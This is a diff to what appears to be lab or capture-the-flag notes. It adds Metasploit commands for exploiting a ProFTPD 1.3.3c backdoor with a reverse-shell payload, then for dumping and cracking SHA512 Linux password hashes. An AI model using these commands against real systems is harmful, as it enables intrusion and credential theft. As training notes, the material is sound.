@@ -30,6 +30,10 @@ We got a Backdoor Command Execution module
 
 `setg rhosts 192.209.144.3`
 
+`set lhost [ownIP]`
+
+`set payload payload/cmd/unix/reverse`
+
 `search proftpd`
 
 We want the proftpd_133c_backdoor:
@@ -83,6 +87,14 @@ We copy post/linux/gather/hashdump
 `run`
 
 This will get the user accs that have passwords and gives us the hashed passwords and saves them. 
+
+Cracking hashed password:
+
+`use auxiliary/analyze/crack_linux`
+
+`set SHA512 true`
+
+`run`
 
 
 
